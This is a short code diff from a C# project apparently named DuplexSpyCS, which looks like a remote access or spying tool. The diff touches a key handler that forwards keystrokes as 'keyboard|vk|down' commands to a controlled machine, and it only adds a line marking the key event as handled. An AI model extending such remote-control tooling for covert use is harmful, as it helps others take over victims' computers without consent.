@@ -418,6 +418,8 @@ namespace DuplexSpyCS
             if (toolStripButton3.Checked)
             {
                 v.fnSendCommand("keyboard|vk|down|" + ((int)e.KeyCode).ToString(), true);
+
+                e.Handled = true;
             }
         }
 
